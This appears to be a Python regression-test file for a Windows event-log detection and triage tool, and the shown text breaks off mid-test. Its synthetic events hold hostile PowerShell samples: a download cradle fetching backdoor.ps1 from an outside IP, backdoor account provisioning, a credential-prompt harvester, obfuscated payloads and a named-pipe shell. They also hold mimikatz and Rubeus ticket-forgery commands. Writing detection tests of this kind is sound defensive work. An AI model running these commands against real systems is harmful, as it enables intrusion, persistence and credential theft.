LICHTSINNIG_UAC_CMSTP_SAMPLE = SAMPLE_CACHE_DIR / "sysmon_1_13_11_cmstp_ini_uacbypass.evtx"
LICHTSINNIG_UAC_PERFMON_SAMPLE = SAMPLE_CACHE_DIR / "sysmon_13_1_12_11_perfmonUACBypass.evtx"
LICHTSINNIG_UAC_COMPMGMT_SAMPLE = SAMPLE_CACHE_DIR / "sysmon_13_1_compmgmtlauncherUACBypass.evtx"
LICHTSINNIG_UAC_APPPATH_SAMPLE = SAMPLE_CACHE_DIR / "sysmon_1_13_UACBypass_AppPath_Control.evtx"
LICHTSINNIG_UAC_SYSPREP_SAMPLE = SAMPLE_CACHE_DIR / "sysmon_1_7_11_sysprep_uacbypass.evtx"
LICHTSINNIG_UAC_SYSPREP_ELEVATE_SAMPLE = SAMPLE_CACHE_DIR / "sysmon_1_7_elevate_uacbypass_sysprep.evtx"
LICHTSINNIG_UAC_MIGWIZ_SAMPLE = SAMPLE_CACHE_DIR / "sysmon_1_7_11_migwiz.evtx"
LICHTSINNIG_UAC_WSCRIPT_SAMPLE = SAMPLE_CACHE_DIR / "sysmon_11_1_15_WScriptBypassUAC.evtx"
LICHTSINNIG_UAC_CLICONFG_SAMPLE = SAMPLE_CACHE_DIR / "sysmon_11_1_7_uacbypass_cliconfg.evtx"
LICHTSINNIG_UAC_MCX2PROV_SAMPLE = SAMPLE_CACHE_DIR / "sysmon_1_7_11_mcx2prov_uacbypass.evtx"
ATOMIC_COMPRESS_EXFIL_SAMPLE = ATOMIC_REPO_SETS_DIR / "compress_exfil_powershell"
ATOMIC_COR_PROFILER_SAMPLE = ATOMIC_REPO_SETS_DIR / "cor_profiler_system"
ATOMIC_DEFENDER_TAMPER_SAMPLE = ATOMIC_REPO_SETS_DIR / "defender_tamper_cmd"
ATOMIC_FIREWALL_RULE_SAMPLE = ATOMIC_REPO_SETS_DIR / "firewall_new_rule"
ATOMIC_RDP_SHADOW_SAMPLE = ATOMIC_REPO_SETS_DIR / "rdp_shadow_registry"
ATOMIC_SERVICE_IMAGEPATH_SAMPLE = ATOMIC_REPO_SETS_DIR / "service_imagepath_reg"
ATOMIC_SIP_HIJACK_SAMPLE = ATOMIC_REPO_SETS_DIR / "sip_hijack_custom_dll"


def make_event(
    event_id: int,
    *,
    timestamp: datetime | None = None,
    computer: str = "host1",
    channel: str = "Security",
    provider: str = "Microsoft-Windows-Security-Auditing",
    subject_user: str = "",
    subject_domain: str = "",
    target_user: str = "",
    target_domain: str = "",
    account_name: str = "",
    source_ip: str = "",
    destination_ip: str = "",
    logon_type: str = "",
    event_data: dict | None = None,
    command_line_value: str = "",
    process_name_value: str = "",
    parent_process_value: str = "",
    service_name_value: str = "",
    raw_xml: str = "",
) -> NormalizedEvent:
    return NormalizedEvent(
        event_id=event_id,
        timestamp=timestamp or datetime.now(timezone.utc),
        computer=computer,
        channel=channel,
        provider=provider,
        subject_user=subject_user,
        subject_domain=subject_domain,
        target_user=target_user,
        target_domain=target_domain,
        account_name=account_name,
        source_ip=source_ip,
        destination_ip=destination_ip,
        logon_type=logon_type,
        command_line_value=command_line_value,
        process_name_value=process_name_value,
        parent_process_value=parent_process_value,
        service_name_value=service_name_value,
        event_data=event_data or {},
        raw_xml=raw_xml,
    )


class PowerShellRegressionTests(unittest.TestCase):
    def test_4104_download_cradle_and_backdoor_provisioning_detection(self):
        base = datetime(2024, 11, 20, 9, 49, 11, tzinfo=timezone.utc)
        cradle = make_event(
            4104,
            timestamp=base,
            computer="bcorp-prod-srv1",
            channel="Microsoft-Windows-PowerShell/Operational",
            provider="Microsoft-Windows-PowerShell",
            event_data={
                "ScriptBlockId": "block-a",
                "ScriptBlockText": "IEX(New-Object Net.WebClient).DownloadString('http://4.231.239.126/backdoor.ps1')",
            },
        )
        provisioning = make_event(
            4104,
            timestamp=base + timedelta(seconds=1),
            computer="bcorp-prod-srv1",
            channel="Microsoft-Windows-PowerShell/Operational",
            provider="Microsoft-Windows-PowerShell",
            event_data={
                "ScriptBlockId": "block-b",
                "ScriptBlockText": """
                    Function ROT13([string]$str, $n) { return $str }
                    Register-ScheduledTask -TaskName "CreateBackdoor" -User "bcorpserveradmin"
                    New-LocalUser -Name "notabackdooruser"
                    Add-LocalGroupMember -Group "Administrators" -Member "notabackdooruser"
                """,
            },
        )

        alerts = powershell_script.detect([cradle, provisioning])
        by_rule = {alert.rule_name: alert for alert in alerts}

        self.assertIn("PowerShell Download Cradle", by_rule)
        self.assertIn("PowerShell Backdoor Provisioning", by_rule)

        cradle_alert = by_rule["PowerShell Download Cradle"]
        provisioning_alert = by_rule["PowerShell Backdoor Provisioning"]

        self.assertEqual(cradle_alert.evidence.get("remote_url"), "http://4.231.239.126/backdoor.ps1")
        self.assertEqual(cradle_alert.evidence.get("remote_ip"), "4.231.239.126")
        self.assertEqual(provisioning_alert.user, "bcorpserveradmin")
        self.assertEqual(provisioning_alert.evidence.get("actor_user"), "bcorpserveradmin")
        self.assertEqual(provisioning_alert.evidence.get("task_name"), "CreateBackdoor")
        self.assertEqual(provisioning_alert.evidence.get("created_username"), "notabackdooruser")
        self.assertEqual(provisioning_alert.evidence.get("group_name"), "Administrators")
        self.assertEqual(provisioning_alert.evidence.get("group_member"), "notabackdooruser")

    def test_4104_encoded_payload_and_named_pipe_shell_detection(self):
        base = datetime(2024, 11, 20, 9, 49, 11, tzinfo=timezone.utc)
        encoded = make_event(
            4104,
            timestamp=base,
            computer="host-encoded",
            channel="Microsoft-Windows-PowerShell/Operational",
            provider="Microsoft-Windows-PowerShell",
            event_data={
                "ScriptBlockId": "block-encoded",
                "ScriptBlockText": """
                    $b64 = 'SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA'
                    IEX([System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($b64)))
                """,
            },
        )
        pipe_shell = make_event(
            4104,
            timestamp=base + timedelta(seconds=1),
            computer="host-encoded",
            channel="Microsoft-Windows-PowerShell/Operational",
            provider="Microsoft-Windows-PowerShell",
            event_data={
                "ScriptBlockId": "block-pipe",
                "ScriptBlockText": r"""
                    $pipe = New-Object System.IO.Pipes.NamedPipeClientStream('.', 'remcom_comunication', 'InOut')
                    $sr = New-Object IO.StreamReader($pipe)
                    IEX $sr.ReadToEnd()
                """,
            },
        )

        alerts = powershell_script.detect([encoded, pipe_shell])
        by_rule = {alert.rule_name: alert for alert in alerts}

        self.assertIn("PowerShell Encoded Payload", by_rule)
        self.assertIn("PowerShell Named Pipe Shell", by_rule)
        self.assertTrue(by_rule["PowerShell Encoded Payload"].evidence.get("encoded_payload"))
        self.assertTrue(by_rule["PowerShell Encoded Payload"].evidence.get("decoded_payload_present"))
        self.assertIn(
            "New-Object Net.WebClient",
            by_rule["PowerShell Encoded Payload"].evidence.get("decoded_payload_excerpt", ""),
        )
        self.assertTrue(by_rule["PowerShell Named Pipe Shell"].evidence.get("named_pipe_shell"))

    def test_4104_invoke_obfuscation_style_script_detection(self):
        event = make_event(
            4104,
            computer="host-obf",
            channel="Microsoft-Windows-PowerShell/Operational",
            provider="Microsoft-Windows-PowerShell",
            event_data={
                "ScriptBlockId": "block-obf",
                "ScriptBlockText": """
                    & ( $eNv:COmSPEc[4,15,25]-JoIN'') ([ChAr[]] (73,69,88,32,40,78,101,119))
                    { ([cHar] ([coNVErT]::TOiNT16( ([String]$_),2 ) )) }
                    $EncodedArray += ([String]([Int][Char]$_ -BXOR $BXORValue))
                """,
            },
        )

        alerts = powershell_script.detect([event])
        alert = next((item for item in alerts if item.rule_name == "PowerShell Obfuscated Script"), None)
        self.assertIsNotNone(alert)
        hits = set(alert.evidence.get("obfuscation_hits", []))
        self.assertTrue({"numeric_char_encoding", "xor_obfuscation", "env_index_reconstruction"} <= hits)

    def test_4104_chain_correlates_to_single_incident(self):
        base = datetime(2024, 11, 20, 9, 49, 11, tzinfo=timezone.utc)
        events = [
            make_event(
                4104,
                timestamp=base,
                computer="bcorp-prod-srv1",
                channel="Microsoft-Windows-PowerShell/Operational",
                provider="Microsoft-Windows-PowerShell",
                event_data={
                    "ScriptBlockId": "block-a",
                    "ScriptBlockText": "IEX(New-Object Net.WebClient).DownloadString('http://4.231.239.126/backdoor.ps1')",
                },
            ),
            make_event(
                4104,
                timestamp=base + timedelta(seconds=1),
                computer="bcorp-prod-srv1",
                channel="Microsoft-Windows-PowerShell/Operational",
                provider="Microsoft-Windows-PowerShell",
                event_data={
                    "ScriptBlockId": "block-b",
                    "ScriptBlockText": """
                        Register-ScheduledTask -TaskName "CreateBackdoor" -User "bcorpserveradmin"
                        New-LocalUser -Name "notabackdooruser"
                        Add-LocalGroupMember -Group "Administrators" -Member "notabackdooruser"
                    """,
                },
            ),
        ]

        alerts = powershell_script.detect(events)
        signals, findings, _ = alerts_to_signals_findings(alerts)
        incidents = build_incidents(events, signals, findings, [])

        incident = next((item for item in incidents if item.incident_type == "powershell_backdoor_provisioning"), None)
        self.assertIsNotNone(incident)
        self.assertEqual(incident.host, "bcorp-prod-srv1")
        self.assertEqual(incident.user, "bcorpserveradmin")
        self.assertEqual(incident.source_ip, "4.231.239.126")
        self.assertIn("CreateBackdoor", incident.summary)
        self.assertIn("notabackdooruser", incident.summary)

    def test_4104_credential_prompt_harvesting_detection(self):
        event = make_event(
            4104,
            computer="MSEDGEWIN10",
            channel="Microsoft-Windows-PowerShell/Operational",
            provider="Microsoft-Windows-PowerShell",
            event_data={
                "ScriptBlockId": "block-cred-harvest",
                "ScriptBlockText": """
                    function Invoke-LoginPrompt{
                        $cred = $Host.ui.PromptForCredential("Windows Security", "Please enter user credentials", "$env:userdomain\\$env:username","")
                        $password = $cred.GetNetworkCredential().password
                        $DS = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Machine)
                        while($DS.ValidateCredentials("$env:userdomain\\$env:username","$password") -ne $True){
                            $cred = $Host.ui.PromptForCredential("Windows Security", "Invalid Credentials, Please try again", "$env:userdomain\\$env:username","")
                            $password = $cred.GetNetworkCredential().password
                        }
                        $cred.GetNetworkCredential() | Select-Object UserName, Domain, Password
                    }
                    Invoke-LoginPrompt
                """,
            },
        )

        alerts = powershell_script.detect([event])
        alert = next((item for item in alerts if item.rule_name == "PowerShell Credential Prompt Harvesting"), None)

        self.assertIsNotNone(alert)
        self.assertEqual(alert.mitre_tactic, "Credential Access")
        self.assertEqual(alert.evidence.get("prompt_title"), "Windows Security")
        self.assertTrue(alert.evidence.get("password_extraction"))
        self.assertTrue(alert.evidence.get("credential_validation_loop"))
        self.assertTrue(alert.evidence.get("credential_output"))

    def test_export_sanitizer_replaces_risky_script_content_but_keeps_indicators(self):
        payload = {
            "event_id": 4104,
            "command_line": "IEX(New-Object Net.WebClient).DownloadString('http://4.231.239.126/backdoor.ps1')",
            "raw_event_data": {
                "ScriptBlockText": """
                    IEX(New-Object Net.WebClient).DownloadString('http://4.231.239.126/backdoor.ps1')
                    Register-ScheduledTask -TaskName "CreateBackdoor"
                    New-LocalUser -Name "notabackdooruser"
                """,
            },
            "evidence": {
                "script_excerpt": "IEX(New-Object Net.WebClient)...",
                "remote_url": "http://4.231.239.126/backdoor.ps1",
                "task_name": "CreateBackdoor",
                "created_username": "notabackdooruser",
            },
        }

        sanitized = sanitize_export_data(payload)
        self.assertIn("sanitized", sanitized["command_line"])
        self.assertIn("url=http://4.231.239.126/backdoor.ps1", sanitized["command_line"])
        self.assertIn("task=CreateBackdoor", sanitized["raw_event_data"]["ScriptBlockText"])
        self.assertNotIn("DownloadString", sanitized["raw_event_data"]["ScriptBlockText"])
        self.assertIn("sanitized", sanitized["evidence"]["script_excerpt"])

    def test_demo_redaction_masks_codex_labels_and_custom_values(self):
        payload = {
            "case_name": "Codex review",
            "primary_user": "CodexSandboxOffline",
            "notes": ["Launched codex.exe via OpenAI.Codex_agent on host-encoded."],
        }

        with mock.patch.dict(
            os.environ,
            {"TRIAGE_DEMO_REDACTION": "1", "TRIAGE_DEMO_REDACTION_VALUES": "host-encoded"},
            clear=False,
        ):
            redacted = apply_demo_redaction_data(payload)

        self.assertEqual(redacted["case_name"], "DemoAgent review")
        self.assertEqual(redacted["primary_user"], "DemoUser")
        self.assertIn("demo-agent.exe", redacted["notes"][0])
        self.assertIn("DemoApp", redacted["notes"][0])
        self.assertIn("DemoValue", redacted["notes"][0])

    def test_export_case_sanitizes_raw_payload_but_preserves_safe_script_excerpt(self):
        event = make_event(
            4104,
            computer="bcorp-prod-srv1",
            channel="Microsoft-Windows-PowerShell/Operational",
            provider="Microsoft-Windows-PowerShell",
            event_data={
                "ScriptBlockId": "block-a",
                "ScriptBlockText": """
                    IEX(New-Object Net.WebClient).DownloadString('http://4.231.239.126/backdoor.ps1')
                    Register-ScheduledTask -TaskName "CreateBackdoor"
                """,
            },
        )
        alerts = powershell_script.detect([event])
        signals, findings, _ = alerts_to_signals_findings(alerts)

        tmpdir = tempfile.mkdtemp(prefix="triage-export-sanitize-", dir=str(ROOT))
        self.addCleanup(shutil.rmtree, tmpdir, True)
        filepath = Path(tmpdir) / "findings.json"
        export_case(signals, findings, [], str(filepath), raw_events=[event], case_meta={"case_name": "sanitize-check"})

        with open(filepath, "r", encoding="utf-8") as handle:
            data = json.load(handle)

        signal = next(item for item in data["signals"] if item["source_rule"] == "PowerShell Download Cradle")
        raw_event = next(item for item in data["raw_events"] if item["event_id"] == 4104)
        self.assertIn("sanitized", signal["command_line"])
        self.assertIn("sanitized", signal["raw_event_data"]["ScriptBlockText"])
        self.assertIn("sanitized", signal["evidence"]["script_excerpt"])
        self.assertIn("url=http://4.231.239.126/backdoor.ps1", signal["evidence"]["script_excerpt"])
        self.assertIn("sanitized", raw_event["event_data"]["ScriptBlockText"])
        self.assertEqual(raw_event["task_name"], "CreateBackdoor")


class FalsePositiveRegressionTests(unittest.TestCase):
    def test_bogus_wmi_detection_is_suppressed(self):
        event = make_event(
            20,
            computer="bcorp-prod-srv1",
            channel="System",
            provider="Microsoft-Windows-WindowsUpdateClient",
            event_data={"updateTitle": "Defender update"},
        )
        self.assertEqual(persistence.detect([event]), [])

    def test_bogus_timestomp_and_process_tampering_are_suppressed(self):
        timestomp = make_event(
            2,
            computer="bcorp-prod-srv1",
            channel="System",
            provider="Microsoft-Windows-Kernel-Boot",
            event_data={"BootMenuPolicy": "0"},
        )
        tamper = make_event(
            25,
            computer="bcorp-prod-srv1",
            channel="System",
            provider="Microsoft-Windows-Kernel-Boot",
            event_data={"BootMenuPolicy": "0"},
        )
        alerts = defense_evasion.detect([timestomp, tamper])
        self.assertEqual(alerts, [])

    def test_non_security_4625_does_not_trigger_credential_alerts(self):
        event = make_event(
            4625,
            computer="bcorp-prod-srv1",
            channel="Application",
            provider="Some-App",
            target_user="bcorpserveradmin",
            source_ip="4.231.239.126",
            event_data={"TargetUserName": "bcorpserveradmin", "IpAddress": "4.231.239.126"},
        )
        alerts = credential_access.detect([event])
        self.assertEqual(alerts, [])


class IdentityAbuseRegressionTests(unittest.TestCase):
    def test_asrep_roasting_requires_disabled_preauth(self):
        positive = make_event(
            4768,
            computer="dc01.corp.local",
            target_user="svc_sql",
            target_domain="CORP",
            source_ip="10.10.10.44",
            event_data={
                "TargetUserName": "svc_sql",
                "TargetDomainName": "CORP",
                "IpAddress": "10.10.10.44",
                "PreAuthType": "0",
                "TicketEncryptionType": "0x17",
                "ServiceName": "krbtgt/CORP.LOCAL",
            },
        )
        negative = make_event(
            4768,
            computer="dc01.corp.local",
            target_user="svc_sql",
            target_domain="CORP",
            source_ip="10.10.10.44",
            event_data={
                "TargetUserName": "svc_sql",
                "TargetDomainName": "CORP",
                "IpAddress": "10.10.10.44",
                "PreAuthType": "2",
                "TicketEncryptionType": "0x12",
                "ServiceName": "krbtgt/CORP.LOCAL",
            },
        )

        alerts = credential_access.detect([positive, negative])
        matches = [item for item in alerts if item.rule_name == "AS-REP Roasting"]
        self.assertEqual(len(matches), 1)
        self.assertEqual(matches[0].user, r"CORP\svc_sql")

    def test_forged_kerberos_ticket_tooling_detection(self):
        golden = make_event(
            4688,
            computer="jump01.corp.local",
            subject_user="attacker",
            subject_domain="CORP",
            process_name_value=r"C:\Tools\mimikatz.exe",
            command_line_value='mimikatz.exe "' + "kerberos::" + 'golden /user:Administrator /domain:corp.local /sid:S-1-5-21-111 /krbtgt:deadbeef /ptt"',
            event_data={"CommandLine": 'mimikatz.exe "' + "kerberos::" + 'golden /user:Administrator /domain:corp.local /sid:S-1-5-21-111 /krbtgt:deadbeef /ptt"'},
        )
        silver = make_event(
            4688,
            computer="jump01.corp.local",
            subject_user="attacker",
            subject_domain="CORP",
            process_name_value=r"C:\Tools\Rubeus.exe",
            command_line_value="Rubeus.exe silver /service:cifs/fileserver.corp.local /ticket:test.kirbi /ptt",
            event_data={"CommandLine": "Rubeus.exe silver /service:cifs/fileserver.corp.local /ticket:test.kirbi /ptt"},
        )

        alerts = credential_access.detect([golden, silver])
        rules = {item.rule_name for item in alerts}
        self.assertIn("Golden Ticket Forgery Tooling", rules)
        self.assertIn("Silver Ticket Forgery Tooling", rules)

    def test_shadow_credentials_detection_and_incident_promotion(self):
        event = make_event(
            5136,
            computer="dc01.corp.local",
            subject_user="attacker",
            subject_domain="CORP",
            channel="Security",
            provider="Microsoft-Windows-Security-Auditing",
            event_data={
                "AttributeLDAPDisplayName": "msDS-KeyCredentialLink",
                "ObjectDN": "CN=svc-backup,CN=Users,DC=corp,DC=local",
                "OperationType": "Value Added",
            },
        )

        alerts = persistence.detect([event])
        alert = next((item for item in alerts if item.rule_name == "Shadow Credentials Modified"), None)
        self.assertIsNotNone(alert)

        signals, findings, _ = alerts_to_signals_findings(alerts)
        incidents = build_incidents([event], signals, findings, [])
        incident = next((item for item in incidents if item.incident_type == "shadow_credentials_abuse"), None)
        self.assertIsNotNone(incident)

    def test_normal_directory_attribute_change_does_not_trigger_shadow_credentials(self):
        event = make_event(
            5136,
            computer="dc01.corp.local",
            subject_user="admin1",
            subject_domain="CORP",
            channel="Security",
            provider="Microsoft-Windows-Security-Auditing",
            event_data={
                "AttributeLDAPDisplayName": "displayName",
                "ObjectDN": "CN=svc-backup,CN=Users,DC=corp,DC=local",
                "OperationType": "Value Added",
            },
        )

        alerts = persistence.detect([event])
        self.assertFalse(any(item.rule_name == "Shadow Credentials Modified" for item in alerts))

    def test_adcs_suspicious_certificate_request_detection(self):
        event = make_event(
            4887,
            computer="ca01.corp.local",
            channel="Security",
            provider="Microsoft-Windows-Security-Auditing",
            subject_user="helpdesk1",
            subject_domain="CORP",
            event_data={
                "Requester": r"CORP\helpdesk1",
                "Subject": r"CORP\Administrator",
                "CertificateTemplate": "User",
                "Attributes": "CertificateTemplate:User SAN:upn=administrator@corp.local",
                "RequestID": "42",
            },
        )

        alerts = persistence.detect([event])
        alert = next((item for item in alerts if item.rule_name == "AD CS Suspicious Certificate Request"), None)
        self.assertIsNotNone(alert)
        self.assertEqual(alert.evidence.get("template"), "User")

    def test_adcs_normal_certificate_request_does_not_trigger_abuse(self):
        event = make_event(
            4887,
            computer="ca01.corp.local",
            channel="Security",
            provider="Microsoft-Windows-Security-Auditing",
            subject_user="alice",
            subject_domain="CORP",
            event_data={
                "Requester": r"CORP\alice",
                "Subject": r"CORP\alice",
                "CertificateTemplate": "User",
                "Attributes": "CertificateTemplate:User",
                "RequestID": "43",
            },
        )

        alerts = persistence.detect([event])
        self.assertFalse(any(item.rule_name == "AD CS Suspicious Certificate Request" for item in alerts))

    def test_adcs_vulnerable_template_change_detection(self):
        event = make_event(
            4899,
            computer="ca01.corp.local",
            channel="Security",
            provider="Microsoft-Windows-Security-Auditing",
            subject_user="caadmin",
            subject_domain="CORP",
            event_data={
                "TemplateName": "User-ESC1",
                "Details": "CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT; Client Authentication; Any Purpose",
            },
        )

        alerts = persistence.detect([event])
        self.assertTrue(any(item.rule_name == "AD CS Vulnerable Template Change" for item in alerts))

    def test_delegation_configuration_changed_detection(self):
        event = make_event(
            5136,
            computer="dc01.corp.local",
            channel="Security",
            provider="Microsoft-Windows-Security-Auditing",
            subject_user="attacker",
            subject_domain="CORP",
            event_data={
                "AttributeLDAPDisplayName": "msDS-AllowedToActOnBehalfOfOtherIdentity",
                "ObjectDN": "CN=WEB01,OU=Servers,DC=corp,DC=local",
            },
        )

        alerts = persistence.detect([event])
        alert = next((item for item in alerts if item.rule_name == "Delegation Configuration Changed"), None)
        self.assertIsNotNone(alert)
        self.assertIn("resource-based", alert.evidence.get("delegation_change", ""))

    def test_delegation_configuration_changed_from_uac_value_cluster(self):
        events = [
            make_event(
                5136,
                timestamp=datetime(2024, 5, 1, 12, 0, tzinfo=timezone.utc),
                computer="dc01.corp.local",
                channel="Security",
                provider="Microsoft-Windows-Security-Auditing",
                subject_user="attacker",
                subject_domain="CORP",
                event_data={
                    "ObjectDN": "CN=WEB01,OU=Servers,DC=corp,DC=local",
                    "AttributeLDAPDisplayName": "userAccountControl",
                    "AttributeValue": "4128",
                    "OperationType": "%%14675",
                },
            ),
            make_event(
                5136,
                timestamp=datetime(2024, 5, 1, 12, 0, 30, tzinfo=timezone.utc),
                computer="dc01.corp.local",
                channel="Security",
                provider="Microsoft-Windows-Security-Auditing",
                subject_user="attacker",
                subject_domain="CORP",
                event_data={
                    "ObjectDN": "CN=WEB01,OU=Servers,DC=corp,DC=local",
                    "AttributeLDAPDisplayName": "userAccountControl",
                    "AttributeValue": "528416",
                    "OperationType": "%%14674",
                },
            ),
        ]

        alerts = persistence.detect(events)
        alert = next((item for item in alerts if item.rule_name == "Delegation Configuration Changed"), None)
        self.assertIsNotNone(alert)
        self.assertIn("TrustedForDelegation", alert.evidence.get("delegation_change", ""))

    def test_process_backed_spn_assignment_detection(self):
        event = make_event(
            4688,
            computer="jump01.offsec.lan",
            channel="Security",
            provider="Microsoft-Windows-Security-Auditing",
            subject_user="lambda-user",
            subject_domain="OFFSEC",
            process_name_value=r"C:\Windows\System32\setspn.exe",
            parent_process_value=r"C:\Windows\System32\cmd.exe",
            command_line_value=r"SetSPN -a MSSQLSvc/HACK-ME-PC.offsec.lan offsec\honey-pot1",
            event_data={
                "NewProcessName": r"C:\Windows\System32\setspn.exe",
                "ParentProcessName": r"C:\Windows\System32\cmd.exe",
                "CommandLine": r"SetSPN -a MSSQLSvc/HACK-ME-PC.offsec.lan offsec\honey-pot1",
            },
        )

        alerts = persistence.detect([event])
        alert = next((item for item in alerts if item.rule_name == "SPN Added to User Account"), None)
        self.assertIsNotNone(alert)
        self.assertEqual(alert.user, r"offsec\honey-pot1")
        self.assertEqual(alert.evidence.get("spn_value"), "MSSQLSvc/HACK-ME-PC.offsec.lan")
        self.assertEqual(alert.evidence.get("detection_source"), "process_command")

    def test_group_policy_object_modified_detection(self):
        event = make_event(
            5136,
            computer="dc01.corp.local",
            channel="Security",
            provider="Microsoft-Windows-Security-Auditing",
            subject_user="gpo-admin",
            subject_domain="CORP",
            event_data={
                "AttributeLDAPDisplayName": "gPCMachineExtensionNames",
                "ObjectDN": "CN={11111111-1111-1111-1111-111111111111},CN=Policies,CN=System,DC=corp,DC=local",
            },
        )

        alerts = persistence.detect([event])
        self.assertTrue(any(item.rule_name == "Group Policy Object Modified" for item in alerts))

    def test_privileged_account_password_reset_detection(self):
        event = make_event(
            4724,
            computer="dc01.corp.local",
            channel="Security",
            provider="Microsoft-Windows-Security-Auditing",
            subject_user="helpdesk1",
            subject_domain="CORP",
            target_user="Administrator",
            target_domain="CORP",
            event_data={
                "SubjectUserName": "helpdesk1",
                "SubjectDomainName": "CORP",
                "TargetUserName": "Administrator",
                "TargetDomainName": "CORP",
                "TargetSid": "S-1-5-21-111-222-333-500",
            },
        )

        alerts = persistence.detect([event])
        alert = next((item for item in alerts if item.rule_name == "Privileged Account Password Reset"), None)
        self.assertIsNotNone(alert)
        self.assertEqual(alert.user, r"CORP\Administrator")

    def test_remote_samr_password_reset_detection(self):
        base = datetime(2024, 12, 4, 22, 9, 0, tzinfo=timezone.utc)
        logon_id = "0x000000010e6e8ef8"
        samr = make_event(
            5145,
            timestamp=base,
            computer="rootdc1.offsec.lan",
            channel="Security",
            provider="Microsoft-Windows-Security-Auditing",
            subject_user="admmig",
            subject_domain="OFFSEC",
            source_ip="10.23.23.9",
            event_data={
                "SubjectUserName": "admmig",
                "SubjectDomainName": "OFFSEC",
                "SubjectLogonId": logon_id,
                "ShareName": r"\\*\IPC$",
                "RelativeTargetName": "samr",
                "IpAddress": "10.23.23.9",
            },
        )
        reset = make_event(
            4724,
            timestamp=base + timedelta(seconds=2),
            computer="rootdc1.offsec.lan",
            channel="Security",
            provider="Microsoft-Windows-Security-Auditing",
            subject_user="admmig",
            subject_domain="OFFSEC",
            target_user="hacker2",
            target_domain="OFFSEC",
            event_data={
                "SubjectUserName": "admmig",
                "SubjectDomainName": "OFFSEC",
                "SubjectLogonId": logon_id,
                "TargetUserName": "hacker2",
                "TargetDomainName": "OFFSEC",
                "TargetSid": "S-1-5-21-4230534742-2542757381-3142984815-1242",
            },
        )

        alerts = persistence.detect([samr, reset])
        alert = next((item for item in alerts if item.rule_name == "Remote SAMR Password Reset"), None)
        self.assertIsNotNone(alert)
        self.assertEqual(alert.source_ip, "10.23.23.9")
        self.assertEqual(alert.user, r"OFFSEC\hacker2")

    def test_cross_account_password_change_detection(self):
        event = make_event(
            4723,
            computer="rootdc1.offsec.lan",
            channel="Security",
            provider="Microsoft-Windows-Security-Auditing",
            subject_user="admmig",
            subject_domain="OFFSEC",
            target_user="hacker2",
            target_domain="OFFSEC",
            event_data={
                "SubjectUserName": "admmig",
                "SubjectDomainName": "OFFSEC",
                "SubjectLogonId": "0x000000010e7c4430",
                "TargetUserName": "hacker2",
                "TargetDomainName": "OFFSEC",
                "TargetSid": "S-1-5-21-4230534742-2542757381-3142984815-1242",
            },
        )

        alerts = persistence.detect([event])
        alert = next((item for item in alerts if item.rule_name == "Cross-Account Password Change"), None)
        self.assertIsNotNone(alert)
        self.assertEqual(alert.subject_user, r"OFFSEC\admmig")
        self.assertEqual(alert.user, r"OFFSEC\hacker2")

    def test_account_control_password_not_required_detection(self):
        event = make_event(
            4738,
            computer="rootdc1.offsec.lan",
            channel="Security",
            provider="Microsoft-Windows-Security-Auditing",
            subject_user="admmig",
            subject_domain="OFFSEC",
            target_user="hack1",
            target_domain="OFFSEC",
            event_data={
                "SubjectUserName": "admmig",
                "SubjectDomainName": "OFFSEC",
                "TargetUserName": "hack1",
                "TargetDomainName": "OFFSEC",
                "OldUacValue": "0x10",
                "NewUacValue": "0x14",
                "UserAccountControl": "\n\t\t%%2082",
            },
        )

        alerts = persistence.detect([event])
        alert = next((item for item in alerts if item.rule_name == "Password Not Required Enabled"), None)
        self.assertIsNotNone(alert)
        self.assertEqual(alert.user, r"OFFSEC\hack1")

    def test_account_control_password_never_expires_detection(self):
        event = make_event(
            4738,
            computer="rootdc1.offsec.lan",
            channel="Security",
            provider="Microsoft-Windows-Security-Auditing",
            subject_user="admmig",
            subject_domain="OFFSEC",
            target_user="hack1",
            target_domain="OFFSEC",
            event_data={
                "SubjectUserName": "admmig",
                "SubjectDomainName": "OFFSEC",
                "TargetUserName": "hack1",
                "TargetDomainName": "OFFSEC",
                "OldUacValue": "0x10",
                "NewUacValue": "0x210",
                "UserAccountControl": "\n\t\t%%2089",
            },
        )

        alerts = persistence.detect([event])
        alert = next((item for item in alerts if item.rule_name == "Password Never Expires Enabled"), None)
        self.assertIsNotNone(alert)
        self.assertEqual(alert.user, r"OFFSEC\hack1")

    def test_account_control_kerberos_preauth_disabled_detection(self):
        event = make_event(
            4738,
            computer="rootdc1.offsec.lan",
            channel="Security",
            provider="Microsoft-Windows-Security-Auditing",
            subject_user="admmig",
            subject_domain="OFFSEC",
            target_user="hack1",
            target_domain="OFFSEC",
            event_data={
                "SubjectUserName": "admmig",
                "SubjectDomainName": "OFFSEC",
                "TargetUserName": "hack1",
                "TargetDomainName": "OFFSEC",
                "OldUacValue": "0x210",
                "NewUacValue": "0x10210",
                "UserAccountControl": "\n\t\t%%2096",
            },
        )

        alerts = persistence.detect([event])
        alert = next((item for item in alerts if item.rule_name == "Kerberos Preauthentication Disabled"), None)
        self.assertIsNotNone(alert)
        self.assertEqual(alert.user, r"OFFSEC\hack1")

    def test_account_control_des_only_detection(self):
        event = make_event(
            4738,
            computer="rootdc1.offsec.lan",
            channel="Security",
            provider="Microsoft-Windows-Security-Auditing",
            subject_user="admmig",
            subject_domain="OFFSEC",
            target_user="hack1",
            target_domain="OFFSEC",
            event_data={
                "SubjectUserName": "admmig",
                "SubjectDomainName": "OFFSEC",
                "TargetUserName": "hack1",
                "TargetDomainName": "OFFSEC",
                "OldUacValue": "0x210",
                "NewUacValue": "0x8210",
                "UserAccountControl": "\n\t\t%%2095",
            },
        )

        alerts = persistence.detect([event])
        alert = next((item for item in alerts if item.rule_name == "Kerberos DES-Only Encryption Enabled"), None)
        self.assertIsNotNone(alert)
        self.assertEqual(alert.user, r"OFFSEC\hack1")

    def test_account_control_reversible_password_encryption_detection(self):
        event = make_event(
            4738,
            computer="rootdc1.offsec.lan",
            channel="Security",
            provider="Microsoft-Windows-Security-Auditing",
            subject_user="admmig",
            subject_domain="OFFSEC",
            target_user="hack1",
            target_domain="OFFSEC",
            event_data={
                "SubjectUserName": "admmig",
                "SubjectDomainName": "OFFSEC",
                "TargetUserName": "hack1",
                "TargetDomainName": "OFFSEC",
                "OldUacValue": "0x210",
                "NewUacValue": "0xA10",
                "UserAccountControl": "\n\t\t%%2091",
            },
        )

        alerts = persistence.detect([event])
